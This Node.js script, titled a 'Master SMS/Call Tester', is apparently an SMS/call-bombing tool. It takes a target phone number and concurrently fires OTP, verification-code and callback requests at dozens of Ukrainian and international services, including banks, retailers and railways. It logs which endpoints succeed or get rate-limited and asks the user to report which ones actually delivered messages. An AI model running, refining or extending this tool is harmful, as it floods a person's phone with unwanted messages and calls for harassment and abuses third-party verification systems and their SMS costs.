#!/usr/bin/env node
import axios from 'axios';
import fs from 'fs';
import { allUkrainianServices } from './all-services.js';
import { internationalServices } from './international-services.js';
import { verifiedServices, formatPhone, buildRequest } from './verified-services.js';

const COLORS = {
  reset: '\x1b[0m',
  bright: '\x1b[1m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  magenta: '\x1b[35m',
  cyan: '\x1b[36m'
};

class MasterTester {
  constructor(phone, options = {}) {
    this.phone = this.normalizePhone(phone);
    this.options = {
      timeout: options.timeout || 10000,
      delay: options.delay || 100,
      concurrency: options.concurrency || 10,
      verbose: options.verbose ?? true,
      retries: options.retries || 0,
      categories: options.categories || 'all',
      onlyVerified: options.onlyVerified || false,
      ...options
    };
    
    this.results = {
      success: [],
      failed: [],
      timeout: [],
      blocked: [],
      unknown: []
    };
    
    this.stats = {
      total: 0,
      completed: 0,
      startTime: null
    };
  }

  normalizePhone(phone) {
    let p = phone.replace(/\D/g, '');
    if (p.startsWith('0')) p = '380' + p.slice(1);
    if (!p.startsWith('380') && p.length === 9) p = '380' + p;
    return p;
  }

  getPhoneFormats() {
    const p = this.phone;
    return {
      '{phone}': p,
      '{phoneLocal}': p.slice(3),
      '{phoneNoCode}': p.slice(2),
      '{phoneFormatted1}': `+${p.slice(0,2)}(${p.slice(2,5)})-${p.slice(5,8)}-${p.slice(8,10)}-${p.slice(10,12)}`,
      '{phoneFormatted2}': `+${p.slice(0,2)} (${p.slice(2,5)}) ${p.slice(5,8)}-${p.slice(8,10)}-${p.slice(10,12)}`,
      '{phoneFormatted3}': `${p.slice(0,2)} (${p.slice(2,5)}) ${p.slice(5,8)} ${p.slice(8,10)} ${p.slice(10,12)}`,
    };
  }

  replacePhone(str) {
    const formats = this.getPhoneFormats();
    let result = str;
    for (const [key, val] of Object.entries(formats)) {
      result = result.split(key).join(val);
    }
    return result;
  }

  getAllServices() {
    const services = [];
    
    if (this.options.onlyVerified) {
      for (const svc of verifiedServices) {
        services.push({
          ...svc,
          source: 'verified',
          priority: 1
        });
      }
      return services;
    }

    for (const svc of verifiedServices) {
      services.push({
        ...svc,
        source: 'verified',
        priority: 1
      });
    }

    for (const svc of allUkrainianServices) {
      const exists = services.find(s => s.url === svc.url);
      if (!exists) {
        services.push({
          ...svc,
          source: 'ukrainian',
          priority: 2
        });
      }
    }

    for (const svc of internationalServices) {
      const exists = services.find(s => s.url === svc.url);
      if (!exists) {
        services.push({
          ...svc,
          source: 'international',
          priority: 3
        });
      }
    }

    if (this.options.categories !== 'all') {
      const cats = this.options.categories.split(',').map(c => c.trim().toLowerCase());
      return services.filter(s => {
        const cat = (s.category || s.source).toLowerCase();
        return cats.some(c => cat.includes(c));
      });
    }

    return services.sort((a, b) => a.priority - b.priority);
  }

  async testService(service) {
    const startTime = Date.now();
    
    try {
      let url = this.replacePhone(service.url);
      let data;
      let headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'uk-UA,uk;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cache-Control': 'no-cache',
        ...(service.headers || {})
      };

      if (service.data) {
        data = JSON.stringify(service.data);
        data = this.replacePhone(data);
        data = JSON.parse(data);
        if (!headers['Content-Type']) headers['Content-Type'] = 'application/json';
      } else if (service.formData) {
        data = this.replacePhone(service.formData);
        if (!headers['Content-Type']) headers['Content-Type'] = 'application/x-www-form-urlencoded';
      } else if (service.body) {
        data = this.replacePhone(service.body);
        if (service.contentType) headers['Content-Type'] = service.contentType;
      }

      if (service.referer) headers['Referer'] = service.referer;

      const config = {
        method: service.method || 'POST',
        url,
        headers,
        timeout: this.options.timeout,
        validateStatus: () => true,
        maxRedirects: 5
      };

      if (config.method !== 'GET' && data) {
        config.data = data;
      }

      const response = await axios(config);
      const duration = Date.now() - startTime;

      let responseBody = response.data;
      if (typeof responseBody === 'string' && responseBody.length > 500) {
        responseBody = responseBody.slice(0, 500) + '...';
      }

      return {
        service: service.name,
        source: service.source,
        category: service.category || 'unknown',
        type: service.type || 'sms',
        url: service.url,
        status: response.status,
        statusText: response.statusText,
        success: response.status >= 200 && response.status < 300,
        duration,
        response: responseBody,
        timestamp: new Date().toISOString()
      };

    } catch (error) {
      const duration = Date.now() - startTime;
      
      if (error.code === 'ECONNABORTED' || error.message?.includes('timeout')) {
        return {
          service: service.name,
          source: service.source,
          url: service.url,
          type: service.type || 'sms',
          status: 'TIMEOUT',
          success: false,
          duration,
          error: 'Request timed out',
          timestamp: new Date().toISOString()
        };
      }

      return {
        service: service.name,
        source: service.source,
        url: service.url,
        type: service.type || 'sms',
        status: 'ERROR',
        success: false,
        duration,
        error: error.message || 'Unknown error',
        timestamp: new Date().toISOString()
      };
    }
  }

  log(color, prefix, message) {
    if (!this.options.verbose) return;
    console.log(`${color}[${prefix}]${COLORS.reset} ${message}`);
  }

  async runBatch(services) {
    const results = [];
    
    for (let i = 0; i < services.length; i += this.options.concurrency) {
      const batch = services.slice(i, i + this.options.concurrency);
      const promises = batch.map(svc => this.testService(svc));
      const batchResults = await Promise.all(promises);
      
      for (const result of batchResults) {
        this.stats.completed++;
        const progress = `[${this.stats.completed}/${this.stats.total}]`;
        
        if (result.status === 'TIMEOUT') {
          this.results.timeout.push(result);
          this.log(COLORS.yellow, 'TIMEOUT', `${progress} ${result.service}`);
        } else if (result.status === 'ERROR') {
          this.results.failed.push(result);
          this.log(COLORS.red, 'ERROR', `${progress} ${result.service}: ${result.error?.slice(0, 60)}`);
        } else if (result.status === 429 || result.status === 403) {
          this.results.blocked.push(result);
          this.log(COLORS.magenta, 'BLOCKED', `${progress} ${result.service} (${result.status})`);
        } else if (result.success) {
          this.results.success.push(result);
          const typeIcon = result.type === 'call' ? '📞' : '📱';
          this.log(COLORS.green, 'SUCCESS', `${progress} ${typeIcon} ${result.service} (${result.status}) ${result.duration}ms`);
        } else {
          this.results.unknown.push(result);
          this.log(COLORS.cyan, 'UNKNOWN', `${progress} ${result.service} (${result.status})`);
        }
        
        results.push(result);
      }
      
      if (i + this.options.concurrency < services.length && this.options.delay > 0) {
        await new Promise(r => setTimeout(r, this.options.delay));
      }
    }
    
    return results;
  }

  async run() {
    const services = this.getAllServices();
    this.stats.total = services.length;
    this.stats.startTime = Date.now();

    console.log(`\n${COLORS.bright}${COLORS.cyan}╔══════════════════════════════════════════════════════════════╗${COLORS.reset}`);
    console.log(`${COLORS.bright}${COLORS.cyan}║          MASTER SMS/CALL TESTER v1.0                        ║${COLORS.reset}`);
    console.log(`${COLORS.bright}${COLORS.cyan}╚══════════════════════════════════════════════════════════════╝${COLORS.reset}\n`);
    
    console.log(`${COLORS.bright}Target:${COLORS.reset} +${this.phone}`);
    console.log(`${COLORS.bright}Services:${COLORS.reset} ${services.length} total`);
    
    const verified = services.filter(s => s.source === 'verified').length;
    const ukrainian = services.filter(s => s.source === 'ukrainian').length;
    const international = services.filter(s => s.source === 'international').length;
    const sms = services.filter(s => s.type !== 'call').length;
    const calls = services.filter(s => s.type === 'call').length;
    
    console.log(`  - Verified: ${verified}`);
    console.log(`  - Ukrainian: ${ukrainian}`);
    console.log(`  - International: ${international}`);
    console.log(`  - SMS services: ${sms}`);
    console.log(`  - Call services: ${calls}`);
    console.log(`${COLORS.bright}Settings:${COLORS.reset} timeout=${this.options.timeout}ms, concurrency=${this.options.concurrency}`);
    console.log(`\n${COLORS.yellow}Starting tests...${COLORS.reset}\n`);

    await this.runBatch(services);

    const duration = ((Date.now() - this.stats.startTime) / 1000).toFixed(1);
    
    console.log(`\n${COLORS.bright}${COLORS.cyan}═══════════════════ RESULTS ═══════════════════${COLORS.reset}\n`);
    console.log(`${COLORS.green}✓ Success (HTTP 2xx):${COLORS.reset} ${this.results.success.length}`);
    console.log(`${COLORS.red}✗ Failed:${COLORS.reset} ${this.results.failed.length}`);
    console.log(`${COLORS.yellow}⏱ Timeout:${COLORS.reset} ${this.results.timeout.length}`);
    console.log(`${COLORS.magenta}⛔ Blocked (403/429):${COLORS.reset} ${this.results.blocked.length}`);
    console.log(`${COLORS.cyan}? Unknown status:${COLORS.reset} ${this.results.unknown.length}`);
    console.log(`\n${COLORS.bright}Duration:${COLORS.reset} ${duration}s`);

    if (this.results.success.length > 0) {
      console.log(`\n${COLORS.bright}${COLORS.green}═══════════════ SUCCESSFUL SERVICES ═══════════════${COLORS.reset}\n`);
      
      const smsSvc = this.results.success.filter(r => r.type !== 'call');
      const callSvc = this.results.success.filter(r => r.type === 'call');
      
      if (smsSvc.length > 0) {
        console.log(`${COLORS.bright}📱 SMS Services (${smsSvc.length}):${COLORS.reset}`);
        for (const r of smsSvc) {
          console.log(`  • ${r.service} [${r.source}] - ${r.status} (${r.duration}ms)`);
        }
      }
      
      if (callSvc.length > 0) {
        console.log(`\n${COLORS.bright}📞 Call Services (${callSvc.length}):${COLORS.reset}`);
        for (const r of callSvc) {
          console.log(`  • ${r.service} [${r.source}] - ${r.status} (${r.duration}ms)`);
        }
      }
    }

    return this.results;
  }

  saveResults(filename = 'master-results.json') {
    const output = {
      phone: this.phone,
      timestamp: new Date().toISOString(),
      duration: Date.now() - this.stats.startTime,
      summary: {
        total: this.stats.total,
        success: this.results.success.length,
        failed: this.results.failed.length,
        timeout: this.results.timeout.length,
        blocked: this.results.blocked.length,
        unknown: this.results.unknown.length
      },
      results: this.results
    };
    
    fs.writeFileSync(filename, JSON.stringify(output, null, 2));
    console.log(`\n${COLORS.bright}Results saved to:${COLORS.reset} ${filename}`);
    return filename;
  }
}

const ADDITIONAL_SERVICES = [
  { name: "Monobank App", url: "https://api.monobank.ua/personal/auth/registration/start", method: "POST", contentType: "application/json", body: '{"phone":"+{phone}"}', source: "extra" },
  { name: "PrivatBank P24", url: "https://link.privatbank.ua/api/p24/pub/confirm/phone", method: "POST", contentType: "application/json", body: '{"phone":"{phone}"}', source: "extra" },
  { name: "Ukrsibbank", url: "https://my.ukrsibbank.com/api/auth/sendOTP", method: "POST", contentType: "application/json", body: '{"phone":"+{phone}"}', source: "extra" },
  
  { name: "Lamoda UA", url: "https://www.lamoda.ua/api/v1/customer/sendCode", method: "POST", contentType: "application/json", body: '{"phone":"+{phone}"}', source: "extra" },
  { name: "Makeup UA", url: "https://makeup.com.ua/ajax/auth/sendcode/", method: "POST", contentType: "application/json", body: '{"phone":"+{phone}"}', source: "extra" },
  { name: "Intertop", url: "https://intertop.ua/api/customer/auth/sendOtp", method: "POST", contentType: "application/json", body: '{"phone":"+{phone}"}', source: "extra" },
  
  { name: "Ukrzaliznytsia", url: "https://booking.uz.gov.ua/api/v1/auth/sendOtp", method: "POST", contentType: "application/json", body: '{"phone":"+{phone}"}', source: "extra" },
  { name: "Flyuia", url: "https://www.flyuia.com/api/auth/phone", method: "POST", contentType: "application/json", body: '{"phone":"+{phone}"}', source: "extra" },
  
  { name: "OLX.ua v2", url: "https://www.olx.ua/api/open/account/phone/verify/", method: "POST", contentType: "application/json", body: '{"phone":"+{phone}"}', source: "extra" },
  { name: "PROM.ua", url: "https://prom.ua/api/auth/phone/send", method: "POST", contentType: "application/json", body: '{"phone":"+{phone}"}', source: "extra" },
  
  { name: "Eva UA", url: "https://eva.ua/api/customer/sendSms", method: "POST", contentType: "application/json", body: '{"phone":"+{phone}"}', source: "extra" },
  { name: "Prostor", url: "https://prostor.ua/api/auth/phone", method: "POST", contentType: "application/json", body: '{"phone":"+{phone}"}', source: "extra" },
  
  { name: "Citrus", url: "https://www.citrus.ua/api/auth/phone/send", method: "POST", contentType: "application/json", body: '{"phone":"+{phone}"}', source: "extra" },
  { name: "F.ua", url: "https://f.ua/api/auth/sms", method: "POST", contentType: "application/json", body: '{"phone":"+{phone}"}', source: "extra" },
  
  { name: "Zakaz.ua", url: "https://zakaz.ua/api/auth/phone/send", method: "POST", contentType: "application/json", body: '{"phone":"+{phone}"}', source: "extra" },
  
  { name: "Ukrposhta", url: "https://track.ukrposhta.ua/api/auth/sendCode", method: "POST", contentType: "application/json", body: '{"phone":"+{phone}"}', source: "extra" },
  { name: "Delivery Auto", url: "https://delivery-auto.com/api/auth/phone", method: "POST", contentType: "application/json", body: '{"phone":"+{phone}"}', source: "extra" },
  
  { name: "Binotel Callback", url: "https://my.binotel.ua/api/4.0/stats/callback", method: "POST", contentType: "application/json", body: '{"phone":"+{phone}"}', type: "call", source: "extra" },
  { name: "Ringostat", url: "https://api.ringostat.net/callback/v1/call", method: "POST", contentType: "application/json", body: '{"phone":"+{phone}"}', type: "call", source: "extra" },
];

const args = process.argv.slice(2);
if (args.includes('--help') || args.includes('-h')) {
  console.log(`
${COLORS.bright}Master SMS/Call Tester${COLORS.reset}

Usage: node master-tester.js <phone> [options]

Options:
  --timeout=<ms>      Request timeout (default: 10000)
  --delay=<ms>        Delay between batches (default: 100)
  --concurrency=<n>   Parallel requests (default: 10)
  --verified          Test only verified services
  --category=<cat>    Filter by category (food,payments,etc)
  --quiet             Minimal output
  --save              Save results to JSON file

Examples:
  node master-tester.js 380501234567
  node master-tester.js 0501234567 --verified
  node master-tester.js +380501234567 --concurrency=5 --save
`);
  process.exit(0);
}

const phone = args.find(a => !a.startsWith('--'));
if (!phone) {
  console.error('Please provide a phone number');
  process.exit(1);
}

const options = {
  timeout: parseInt(args.find(a => a.startsWith('--timeout='))?.split('=')[1]) || 10000,
  delay: parseInt(args.find(a => a.startsWith('--delay='))?.split('=')[1]) || 100,
  concurrency: parseInt(args.find(a => a.startsWith('--concurrency='))?.split('=')[1]) || 10,
  onlyVerified: args.includes('--verified'),
  categories: args.find(a => a.startsWith('--category='))?.split('=')[1] || 'all',
  verbose: !args.includes('--quiet')
};

allUkrainianServices.push(...ADDITIONAL_SERVICES.filter(s => !allUkrainianServices.find(u => u.url === s.url)));

const tester = new MasterTester(phone, options);
tester.run().then(results => {
  if (args.includes('--save')) {
    tester.saveResults();
  }
  
  console.log(`\n${COLORS.bright}${COLORS.yellow}⚠️  IMPORTANT: Please check your phone for actual SMS/calls received!${COLORS.reset}`);
  console.log(`${COLORS.cyan}Many services return HTTP 200 but don't actually send messages.${COLORS.reset}`);
  console.log(`${COLORS.cyan}Report back which services ACTUALLY sent something.${COLORS.reset}\n`);
});
